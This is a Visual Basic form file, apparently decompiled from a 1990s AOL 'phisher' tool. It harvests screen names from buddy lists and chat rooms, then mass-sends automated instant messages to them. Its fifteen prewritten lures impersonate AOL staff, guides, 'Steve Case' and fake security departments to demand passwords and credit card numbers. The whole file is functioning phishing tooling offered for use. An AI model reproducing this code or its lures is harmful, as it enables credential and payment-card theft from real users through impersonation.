' PHISH.FRM
Option Explicit

Sub Command3D1_Click ()
Dim l001C As Variant
Dim l0022 As Variant
Dim l0026 As String
Dim l002A As Variant
Dim l002E As Variant
Dim l0034 As Variant
Dim l003A As Variant
Dim l003E As Variant
Dim l0042 As Variant
Dim l0046 As Variant
Dim l004A As String
Dim l004C As Variant
Dim l0050 As Variant
Dim l0054 As Variant
Dim l0058 As String
Dim l005C As Variant
Dim l0060 As Variant
Dim l006A As Variant
Dim l006E As Variant
Dim l007E As Variant
Dim l0082 As Variant
Dim l0086 As Variant
l001C = extfn1018("AOL FRAME25", 0&)
l0022 = extfn10F8(l001C, "Welcome")
l0026$ = String(30, 0)
l002A = extfnFA8(l0022, l0026$, 250)
If  l002A <= 7 Then
MsgBox "An error occurred: Not Signed On!", 16
Exit Sub
End If
l002E = extfn1018("AOL FRAME25", 0&)
l001C = extfn10F8(l002E, "People")
If  l001C = 0 Then
MsgBox "People list not found!", 16
Exit Sub
End If
l0034 = extfn10C0(l001C, "_AOL_listbox")
l003A = extfnFE0(l0034, 1036, 0, 0)
For l003E = 0 To l003A - 1
DoEvents
l0042 = extfn1018("AOL FRAME25", 0&)
l0046 = extfn10F8(l0042, "Welcome")
l004A$ = String(30, 0)
l004C = extfnFA8(l0046, l004A$, 250)
l0050 = l004C - 1
On Error Resume Next
l0054 = Mid(Left(l004A$, l0050), 10)
If  Err Then
Exit Sub
End If
l0058$ = String(255, 0)
l005C = extfn1608(l003E, l0058$)
l0060 = InStr(l0058$, Chr(0))
If  l0060 Then
l0058$ = Mid(l0058$, 1, l0060 - 1)
End If
l001C = InStr(1, Text3.Text, l0058$, 1)
If  l001C Then
l0022 = Mid(Text3.Text, l001C + Len(l0058$), 1)
If  l0022 = "," Then GoTo 3004
End If
l006A = InStr(1, l0058$, "Guide", 1)
If  l006A Then GoTo 3004
l006E = InStr(1, l0058$, l0054, 1)
If  l006E Then GoTo 3004
List1.AddItem l0058$
Text3.Text = Text3.Text + l0058$ + ","
l007E = InStr(Frame3D2.Caption, "People to phish: ")
l0082 = Mid(Frame3D2.Caption, l007E + 17, Len(Frame3D2.Caption))
l0086 = Int(l0082) + 1
Frame3D2.Caption = "People to phish: " + Str(l0086)

3004 :
Next l003E
End Sub

Sub Command3D2_Click ()
If  List1.ListCount = 0 Then
MsgBox "There is nobody to phish!", 16
Exit Sub
End If
If  Text1.Text = "" Then
MsgBox "There is no message to be sent!", 16
Exit Sub
End If
If  Command3D2.Caption = "Start" Then
Command3D2.Caption = "Stop"
Timer1.Enabled = True
Timer1.Interval = 1
Else
Command3D2.Caption = "Start"
Timer1.Interval = 0
Timer1.Enabled = False
End If
End Sub

Sub Command3D3_Click ()
List1.Clear
Frame3D2.Caption = "People to phish: 0"
Text3.Text = ""
End Sub

Sub Command3D4_Click ()
Dim l009C As Variant
Dim l00A0 As Variant
Dim l00A4 As String
Dim l00A6 As Variant
Dim l00AA As Variant
Dim l00B0 As Variant
Dim l00B4 As Variant
Dim l00B8 As Variant
Dim l00BC As Variant
Dim l00C0 As Variant
Dim l00C4 As String
Dim l00C6 As Variant
Dim l00CA As Variant
Dim l00CE As Variant
Dim l00D2 As String
Dim l00D4 As Variant
Dim l00D8 As Variant
Dim l00DC As Variant
Dim l00E0 As Variant
Dim l00E4 As Variant
Dim l00E8 As Variant
Dim l00EC As Variant
l009C = extfn1018("AOL FRAME25", 0&)
l00A0 = extfn10F8(l009C, "Welcome")
l00A4$ = String(30, 0)
l00A6 = extfnFA8(l00A0, l00A4$, 250)
If  l00A6 <= 7 Then
MsgBox "An error occurred: Not Signed On!", 16
Exit Sub
End If
l00AA = extfn1018("AOL FRAME25", 0&)
l009C = extfn10F8(l00AA, "AOL Live!")
l009C = extfn1088(l009C)
If  l009C = 0 Then
MsgBox "Room List not found!", 16
Exit Sub
End If
l00B0 = extfn10C0(l009C, "_AOL_listbox")
l00B4 = extfnFE0(l00B0, 1036, 0, 0)
For l00B8 = 0 To l00B4 - 1
DoEvents
l00BC = extfn1018("AOL FRAME25", 0&)
l00C0 = extfn10F8(l00BC, "Welcome")
l00C4$ = String(30, 0)
l00C6 = extfnFA8(l00C0, l00C4$, 250)
l00CA = l00C6 - 1
On Error Resume Next
l00CE = Mid(Left(l00C4$, l00CA), 10)
If  Err Then
Exit Sub
End If
l00D2$ = String(255, 0)
l00D4 = extfn1608(l00B8, l00D2$)
l00D8 = InStr(l00D2$, Chr(0))
If  l00D8 Then
l00D2$ = Mid(l00D2$, 1, l00D8 - 1)
End If
l009C = InStr(1, Text3.Text, l00D2$, 1)
If  l009C Then
l00A0 = Mid(Text3.Text, l009C + Len(l00D2$), 1)
If  l00A0 = "," Then GoTo 3003
End If
l00DC = InStr(1, l00D2$, "Guide", 1)
If  l00DC Then GoTo 3003
l00E0 = InStr(1, l00D2$, l00CE, 1)
If  l00E0 Then GoTo 3003
List1.AddItem l00D2$
Text3.Text = Text3.Text + l00D2$ + ","
l00E4 = InStr(Frame3D2.Caption, "People to phish: ")
l00E8 = Mid(Frame3D2.Caption, l00E4 + 17, Len(Frame3D2.Caption))
l00EC = Int(l00E8) + 1
Frame3D2.Caption = "People to phish: " + Str(l00EC)

3003 :
Next l00B8
End Sub

Sub Form_Load ()
extsub1050 phish.hWnd, -1, 0, 0, 0, 0, 3
Option3D4.Value = True
End Sub

Sub HScroll1_Change ()
End Sub

Sub List1_Click ()
Dim l00FA As Variant
Dim l00FE As Variant
Dim l0102 As Variant
Dim l0106 As Variant
Dim l010A As Variant
l00FA = List1.ListIndex
l00FE = List1.List(l00FA)
On Error Resume Next
List1.RemoveItem l00FA
If  Err Then
MsgBox "Highlight the person you want to delete!", 16
Exit Sub
Else
l0102 = InStr(1, Text3.Text, l00FE + ",", 1)
If  l0102 Then
l0106 = Mid(Text3.Text, 1, l0102 - 1)
l010A = Mid(Text3.Text, l0102 + Len(l00FE) + 1, Len(Text3.Text))
Text3.Text = l0106 + l010A
l00FA = Mid(Frame3D2.Caption, 17, Len(Frame3D2.Caption))
l0106 = l00FA - 1
Frame3D2.Caption = "People to phish: " + l0106
End If
End If
End Sub

Sub sub6DD8 ()
Dim l010E As Variant
l010E = "                       "
End Sub

Sub sub6E10 ()
End Sub

Sub Option3D1_Click (Value As Integer)
Text1 = "Due to problems of your local server, we have lost information concerning on your log-on information. Please hit the respond button and fill in the information needed." + Chr(13) + Chr(10)
Text1 = Text1 + "SCREEN NAME:" + "            " + "PASSWORD:"
End Sub

Sub Option3D10_Click (Value As Integer)
Text1.Text = "Hello fellow AOL Member, I am a guide from AOL and I need you to respond back with your log-on information for access to the chat rooms. If you do not respond, you are not allowed within the rooms."
End Sub

Sub Option3D11_Click (Value As Integer)
Text1.Text = "HI. I AM FROM OTC (ONLINE TECHNICAL CONSULTANTS) AND EARLIER TODAY HE HAD A HACKER HACK INTO THE MAIN COMPUTER SYSTEMS. WE LOST ALL VITAL INFORMATION CONCERNING ON YOUR ACCOUNT. PLEASE RESPOND BACK WITH YOUR CURRENT PASSWORD."
End Sub

Sub Option3D12_Click (Value As Integer)
Text1.Text = "Good evening, I from the America Online Password Solicitation Department, and I need you to respond back with your current password for verification. Thank you for your cooperation."
End Sub

Sub Option3D13_Click (Value As Integer)
Text1.Text = "Hi, I am from the Internet Agency. Please respond back with your credit card information in order to access the internet. This way, we know that you are a true AOL Member."
End Sub

Sub Option3D14_Click (Value As Integer)
Text1.Text = " - ATTENTION - Due to complicated problems with your server, we at America Online have lost vital information concerning on your account. Please respond back with your current password. Thank you for your cooperation."
End Sub

Sub Option3D15_Click (Value As Integer)
Text1.Text = "I am from the Password Verification Department and earlier today, we had an America Online employee sabotage our records. Please respond back with your credit card information and password."
End Sub

Sub Option3D2_Click (Value As Integer)
Text1 = "Type your message here."
End Sub

Sub Option3D3_Click (Value As Integer)
Dim l0124 As Variant
Dim l0128 As Variant
Dim l012C As String
Dim l012E As Variant
Dim l0132 As Variant
Dim l0136 As Variant
Dim l013A As Variant
l0124 = extfn1018("AOL FRAME25", 0&)
l0128 = extfn10F8(l0124, "Welcome")
l012C$ = String(30, 0)
l012E = extfnFA8(l0128, l012C$, 250)
l0132 = InStr(l012C$, "!")
On Error Resume Next
l0136 = Mid(l012C$, 1, l0132 - 1)
l013A = Mid(l0136, 10, 10)
Text1.Text = "Dear User," + Chr(13) + Chr(10) + "Hello, I am " + l013A + ", a guide from America Online. Due to a problem with your server, we need you to respond back with your screen name and password."
End Sub

Sub Option3D4_Click (Value As Integer)
Text1 = "***ATTENTION USER***" + Chr(13) + Chr(10)
Text1 = Text1 + "Due to a problem that we are experiencing with your server, we need you to click on the respond button and type in your password so that we can correct the problem as soon as possible. Thank You." + Chr(13) + Chr(10)
Text1 = Text1 + "          " + "         -AOL DEPARTMENT-"
End Sub

Sub Option3D5_Click (Value As Integer)
Text1.Text = "Dear America Online user, due to a problem with your server (AOLNET), we have lost vital information concerning on your account. Thank you for your consideration."
End Sub

Sub Option3D6_Click (Value As Integer)
Text1.Text = "Hi, I am Steve Case (Founder of AOL) and I need you to reply back with your password in order to verify that you are a true AOL user and not a Hacker. Thank you for your cooperation."
End Sub

Sub Option3D7_Click (Value As Integer)
Text1.Text = "Hello, I am Sam Kieth, an employee from America Online. Earlier today, we had a system crash and lost ALL VITAL INFORMATION concerning on your account. Please reply back with your password. Thank you."
End Sub

Sub Option3D8_Click (Value As Integer)
Text1.Text = "*** America Online Flash News*** Due to a bug in our system, we need you to respond back with your credit card information and password."
End Sub

Sub Option3D9_Click (Value As Integer)
Text1.Text = "Hi, I am from the AHS (Anti-Hacking Service) and I need you to respond back with your password in order to verify that your account is not fake. Thank you for your cooperation."
End Sub

Sub sub7190 ()
End Sub

Sub Text2_KeyPress (KeyAscii As Integer)
Dim l014C As Variant
Dim l0156 As Variant
Dim l015A As Variant
Dim l015E As Variant
l014C = Chr(KeyAscii)
If  l014C = Chr(13) Then
If  Text2.Text = "" Then GoTo 200
For l014C = 0 To List1.ListCount
l0156 = InStr(1, List1.List(l014C), Text2.Text, 1)
If  l0156 Then
If  Len(List1.List(l014C)) = Len(Text2.Text) Then
Text2.Text = ""
GoTo 200
End If
End If
Next l014C
List1.AddItem Text2
Text3.Text = Text3.Text + Text2.Text + ","
Text2 = ""
l015A = Mid(Frame3D2.Caption, 17, Len(Frame3D2.Caption))
l015E = Int(l015A) + 1
Frame3D2.Caption = "People to phish: " + Str(l015E)
End If
200 :
End Sub

Sub Timer1_Timer ()
Dim l0162 As Variant
Dim l0166 As Variant
Dim l016C As Variant
Dim l0172 As Variant
Dim l0176 As Variant
Dim l017A As Variant
Dim l0180 As Variant
Dim l0184 As String
Dim l0186 As Variant
Dim l018A As Variant
Dim l018E As Variant
Dim l0192 As String
Dim l0194 As Variant
Dim l0198 As Variant
Dim l019E As Variant
Dim l01A2 As Variant
Dim l01A6 As Variant
Dim l01AC As Variant
Dim l01B0 As Variant
Dim l01B4 As Variant
Dim l01B8 As Variant
Dim l01BC As Variant
Dim l01C0 As Variant
Dim l01C4 As Variant
Dim l01C8 As Variant
l0162 = extfn1018("AOL FRAME25", 0&)
For l0166 = 0 To List1.ListCount - 1
34 :
If  Timer1.Interval = 0 Then GoTo L4FAAA
l016C = fn5D0("Mem&bers", "Send an Instant Message")
l0172 = fn138()
If  l0172 = 8 Then
36 :
DoEvents
l0176 = extfn10F8(l0162, "Send Instant Message")
If  l0176 = 0 Then GoTo 36
Else
l0176 = extfn10F8(l0162, "Send Instant Message")
If  l0176 = 0 Then GoTo 34
End If
l017A = extfn10C0(l0176, "_AOL_EDIT")
l0180 = extfn11A0(l017A, 12, 0, List1.List(l0166))
l0184$ = String(Len(List1.List(l0166)), 0)
l0186 = extfn11A0(l017A, 13, Len(List1.List(l0166)) + 1, l0184$)
If  l0184$ <> List1.List(l0166) Then GoTo 36

56 :
DoEvents
If  Timer1.Interval = 0 Then GoTo L4FAAA
l018A = extfn10F8(l0162, "To:")
l018E = extfn1088(l018A)
l0192$ = String(255, 0)
l0194 = extfnFA8(l018E, l0192$, 250)
If  l0192$ Like "*Send Instant Message*" Then
Else
GoTo 56
End If
l0198 = extfn10F8(l0176, "Send")
l019E = extfn1168(l0198, 3)
If  l0172 = 5 Then
Else
l019E = extfn10C0(l0176, "RICHCNTL")
End If
l01A2 = Chr(13) + Chr(10)
l01A6 = extfn11A0(l019E, 12, 0, Text1.Text)
If  l0172 = 5 Then
l01AC = fn1480(l0198)
Else
l01B0 = extfn1168(l019E, 2)
l01B4 = fn1480(l01B0)
End If
Do Until 2 > 3
If  Timer1.Interval = 0 Then GoTo L4FAAA
If  l0172 = 5 Then
l01B8 = extfn10F8(l0162, "Available?")
Else
l018A = extfn10F8(l0162, "To:")
l018E = extfn1088(l018A)
l0192$ = String(255, 0)
l0194 = extfnFA8(l018E, l0192$, 250)
If  l0192$ Like "*Send Instant Message*" Then
l01B8 = extfn10F8(l018E, "To:")
Else
l01B8 = 0
End If
End If
If  l01B8 = 0 Then GoTo 23
l01BC = extfn1018("#32770", "America Online")
If  l01BC > 0 Then
l01C0 = extfn10F8(l01BC, "OK")
l01C4 = fn1480(l01C0)
l01C8 = extfnFE0(extfn1088(l01B8), 16, 0, 0)
GoTo 23
End If
DoEvents
Loop
23 :
If  Timer1.Interval = 0 Then GoTo L4FAAA
Next l0166
Timer1.Interval = 0
Timer1.Enabled = False
GoTo L4FAAA
L4FAAA:
Command3D2.Caption = "Start"
End Sub

Sub sub9980 ()
Unload phish
End Sub
